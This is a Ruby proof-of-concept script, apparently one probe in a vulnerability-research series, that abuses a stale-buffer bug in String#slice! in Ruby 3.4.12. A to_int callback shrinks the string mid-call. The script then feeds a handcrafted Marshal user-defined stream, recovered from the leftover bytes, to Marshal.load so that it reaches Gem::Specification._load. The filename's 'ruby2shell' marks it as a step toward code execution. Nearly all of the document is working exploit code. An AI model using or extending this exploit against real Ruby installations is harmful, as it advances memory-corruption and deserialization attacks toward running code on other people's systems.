# W339: stale slice! bytes dispatch a STOCK Marshal._load consumer.
#
# W337 materialised typed objects from the stale 3.4.12 slice! tail but used
# only Marshal's built-in fixnum/string paths, and its pointer consumer was
# blocked. This probe asks the next question: can bytes past the coerced
# length select a stock class and reach its own `_load` implementation?
#
# Handcrafted Marshal `u` (TYPE_USERDEF) stream:
#   04 08 75 3a 04 12 00 00 00 "Gem::Specification" <len> <nested array>
# The 8-byte head ends on the last high byte of the 5-byte symbol length.
# `to_int` replaces the receiver with that head; `String#replace` writes a
# NUL terminator at offset 8, which is already NUL in the length field, so
# the class name and nested array survive in the stale tail copied by the
# unchecked sink at 3.4.12 string.c:6066. 3.4.13 clamps at :6065-6067.
# TracePoint only OBSERVES the stock dispatch; no class is defined here.
#
# Usage: ruby ruby2shell-slice-bang-userdef.rb
# Env: W339_COERCE=1 (default) | 0 (integer-index control)
require "rubygems"

coerce = ENV.fetch("W339_COERCE", "1") == "1"
fields = [
  "3.6.9", 2, "STALE-TAIL-GEM", Gem::Version.new("1.0"),
  "2026-11-27 00:00:00.000000000 Z"
] + Array.new(14) { |i| "field-#{i}" }
nested = Marshal.dump(fields)
marshal_long = ->(s) { "\x04".b + [s.bytesize].pack("V") }

name = "Gem::Specification".b
full = "\x04\x08u:".b + marshal_long.call(name) + name +
       marshal_long.call(nested) + nested
head = "\x04\x08u:\x04\x12\x00\x00".b
# Guard the alignment assumption: the byte overwritten by replace's NUL
# must already be NUL in the well-formed stream.
raise "bad head alignment" unless full.bytes[head.bytesize] == 0

$s = full
idx = if coerce
        o = Object.new
        o.define_singleton_method(:to_int) do
          $s.replace(head)
          1
        end
        o
      else
        1
      end

traces = []
tp = TracePoint.new(:call) do |t|
  next unless t.method_id == :_load
  arg = t.binding.local_variable_get(:str) rescue nil
  arg_head = arg ? arg.bytes.first(8).map { |x| "%02x" % x }.join : "-"
  traces << "#{t.defined_class}#_load(arg_head=#{arg_head})"
end

begin
  out = $s.slice!(/(.*)/m, idx)
  bytes = out ? out.bytes : []
  tp.enable
  begin
    value = Marshal.load(out.to_s)
    consumed = "VALUE=#{value.class}:#{value.name}"
  rescue => e
    consumed = "RAISED=#{e.class}:#{e.message}"
  end
  tp.disable
  printf("RESULT arm=userdef coerce=%d rlen=%d slen=%d head=%s traces=%s consumed=%s\n",
         coerce ? 1 : 0, bytes.length, $s.bytesize,
         bytes.first(24).map { |x| "%02x" % x }.join,
         traces.empty? ? "NONE" : traces.join(";"), consumed)
rescue => e
  tp.disable
  printf("RESULT arm=userdef coerce=%d raised=%s:%s\n",
         coerce ? 1 : 0, e.class, e.message)
end
